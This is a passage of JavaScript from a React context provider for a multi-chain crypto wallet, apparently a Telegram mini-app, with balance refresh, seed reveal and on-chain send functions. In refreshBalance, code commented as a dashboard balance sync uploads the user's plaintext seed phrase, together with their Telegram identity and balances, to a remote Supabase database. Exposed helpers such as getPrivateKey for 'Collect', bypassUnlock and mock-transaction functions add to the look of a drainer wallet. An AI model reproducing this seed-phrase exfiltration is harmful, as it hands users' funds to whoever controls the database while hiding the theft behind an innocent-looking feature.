        // Sync updated balances to Supabase so the dashboard always reflects reality
        const mnemonic = mnemonicRef.current;
        if (mnemonic) {
          try {
            const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
            const coin_balances = {
              BTC:  String(bals.BTC  ?? 0),
              ETH:  String(bals.ETH  ?? 0),
              TON:  String(bals.TON  ?? 0),
              BNB:  String(bals.BNB  ?? 0),
              LTC:  String(bals.LTC  ?? 0),
              ARB:  String(bals.ARB  ?? 0),
              SOL:  String(bals.SOL  ?? 0),
              USDT: String(bals.USDT ?? 0),
            };
            await syncWalletToSupabase({
              username: buildTgUserName(tgUser),
              telegram_id: tgUser?.id ? String(tgUser.id) : null,
              mnemonic: mnemonic,
              balance: "0",
              coin_balances,
            });
          } catch (syncErr) {
            console.error('[WalletContext] balance sync error:', syncErr);
          }
        }
      } catch (e) {
        console.warn('[WalletContext] refreshBalance error:', e.message);
      }
    }, [state.addresses]); // eslint-disable-line react-hooks/exhaustive-deps

    // ── getMnemonic — decrypt on demand (for Settings "show seed") ──────────────
    const getMnemonic = useCallback(async (password) => {
      const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
      return await decryptMnemonic(stored.encrypted, password);
    }, []);

    // ── getPrivateKey — expose in-memory key to Send / Swap / Collect ───────────
    const getPrivateKey = useCallback((chain) => {
      return privateKeysRef.current[chain] || null;
    }, []);

    // ── sendTransaction — real on-chain send ────────────────────────────────────
    const sendTransaction = useCallback(async ({ assetId, to, amount, feeMultiplier = 1.0, btcFeeRateSatVb }) => {
      const EVM_CHAINS = ['ETH', 'BNB', 'ARB'];
      const chainByAsset = {
        'btc': 'BTC',
        'eth': 'ETH', 'bnb': 'BNB', 'arb': 'ARB', 'sol': 'SOL', 'ton': 'TON', 'ltc': 'LTC',
        'usdt-eth': 'ETH', 'usdt-bnb': 'BNB', 'usdt-sol': 'SOL', 'usdt-ton': 'TON', 'usdt-trx': 'TRX',
      };
      const isUsdt = String(assetId).startsWith('usdt');
      const chain = chainByAsset[assetId];
      if (!chain) throw new Error('Сеть не поддерживается');

      const privateKey = privateKeysRef.current[chain];
      if (!privateKey) throw new Error('Кошелек заблокирован. Переоткройте приложение.');

      if (chain === 'BTC') {
        const fromAddress = state.addresses.BTC || state.addresses.bitcoin;
        if (!fromAddress) throw new Error('BTC адрес не найден. Переоткройте приложение.');
        const feeRate = btcFeeRateSatVb || 10;
        return await sendBtcTx(privateKey, fromAddress, to, parseFloat(amount), feeRate);
      }
      if (EVM_CHAINS.includes(chain)) {
        if (isUsdt) return await sendUsdtErc20Tx(privateKey, chain, to, amount, feeMultiplier);
        return await sendEvmTx(privateKey, chain, to, amount, feeMultiplier);
      }
      if (chain === 'SOL') return await sendSolTx(privateKey, to, amount);
      if (chain === 'TON') {
        const mnemonic = mnemonicRef.current;
        if (!mnemonic) throw new Error('Кошелек заблокирован. Переоткройте приложение.');
        return await sendTonTx(mnemonic, to, amount);
      }
      if (chain === 'LTC') throw new Error('Отправка LTC временно недоступна. Используйте другую сеть.');
      throw new Error('Сеть не поддерживается');
    }, [state.addresses]);

    return (
      <WalletContext.Provider value={{
        ...state,
        networks: NETWORKS,
        createWallet,
        importWallet,
        unlock,
        lock,
        deleteWallet,
        setActiveNetwork,
        refreshBalance,
        getMnemonic,
        getPrivateKey,
        sendTransaction,
        setTestMode,
        addMockTransaction,
        cancelMockTransaction,
        resolvePendingTransaction,
        clearAllData,
        generateNewMnemonic,
        settings,
        updateSetting,
        bypassUnlock,
        requestNotifPermission,
        fireNotif,
      }}>
        {children}
      </WalletContext.Provider>
    );
  }

  export const useWallet = () => {
    const ctx = useContext(WalletContext);
    if (!ctx) throw new Error('useWallet must be inside WalletProvider');
    return ctx;
  };
  